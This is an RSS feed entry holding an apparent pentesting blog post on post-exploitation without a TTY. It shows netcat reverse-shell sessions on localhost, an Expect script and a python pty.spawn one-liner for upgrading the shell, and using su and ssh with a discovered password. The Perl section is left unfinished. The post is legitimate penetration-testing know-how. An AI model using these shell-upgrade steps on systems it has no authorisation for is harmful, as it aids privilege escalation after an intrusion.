<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>expect &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/expect/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 15:53:03 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Post-Exploitation Without A TTY</title>
		<link>https://pentestmonkey.net/blog/post-exploitation-without-a-tty</link>
					<comments>https://pentestmonkey.net/blog/post-exploitation-without-a-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 16 Jan 2008 22:08:59 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[expect]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=35</guid>

					<description><![CDATA[This is a follow-up to a topic I touched on breifly before when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This is a follow-up to a topic I touched on breifly <a href="http://pentestmonkey.net/blog/ssh-with-no-tty/">before</a> when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn&#8217;t run &#8220;login&#8221; or &#8220;su&#8221;.  Both of these required a TTY in order to work.</p>
<p>I don&#8217;t present a definitive solution in this problem (if you have one please sent it in!).  However I discuss a couple of approaches to getting a TTY&#8230;</p>
<p><span id="more-35"></span></p>
<p>Post-exploitation activities during a pentest may involve using &#8220;su&#8221; to try and log into other local accounts, or using &#8220;ssh&#8221; to log into other hosts.</p>
<h3>Using &#8220;Expect&#8221; To Get A TTY</h3>
<p>If you&#8217;re lucky enough to have the <a href="http://en.wikipedia.org/wiki/Expect">Expect</a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as &#8220;ssh&#8221;, &#8220;su&#8221; and &#8220;login&#8221;.</p>
<pre>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact</pre>
<p>The following output taken from a <a href="http://pentestmonkey.net/tools/php-reverse-shell/">reverse shell</a> demonstrates how &#8220;su&#8221; doesn&#8217;t work until we use the Expect script:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:  mypassword
localhost ~ #</pre>
<p>Likewise, the ssh client doesn&#8217;t seem to work properly (with or without the -T option):</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250
sh: no job control in this shell
sh-3.2$ ssh localhost
Pseudo-terminal will not be allocated because stdin is not a terminal.
&lt;big pause&gt;</pre>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252
sh: no job control in this shell
sh-3.2$ ssh -T localhost
&lt;big pause&gt;</pre>
<p>After we run sh.exp we are able to use the ssh client as normal:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498
sh: no job control in this shell
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ ssh localhost
ssh localhost
Password: mypassword
Last login: Wed Jan 16 13:43:20 2008 from 127.0.0.1

user@localhost ~ $</pre>
<h3>Using Python To Get A TTY</h3>
<p>This is quite an elegant solution I found on <a href="http://tero.marttila.de/">Tero&#8217;s glob</a>.  It should be effective against gentoo systems at least because the gentoo package management runs on python.</p>
<p>$ nc -v -n -l -p 1234<br />
listening on [any] 1234 &#8230;<br />
sh: no job control in this shell<br />
sh-3.2$ su &#8211;<br />
su: must be run from a terminal<br />
sh-3.2$ python -c &#8216;import pty; pty.spawn(&#8220;/bin/sh&#8221;)&#8217;<br />
sh-3.2$ su &#8211;<br />
su &#8211;<br />
Password:<br />
localhost ~ #</p>
<h3>Using PERL To Get A TTY</h3>
<p>This is not such as great solution as IO::Pty isn&#8217;t installed by default on any system I&#8217;ve seen.  For completeness, though:</p>
<p>&lt;hmmm&#8230; can&#8217;t get it will working.  Will post later.&gt;</p>
<pre></pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/post-exploitation-without-a-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
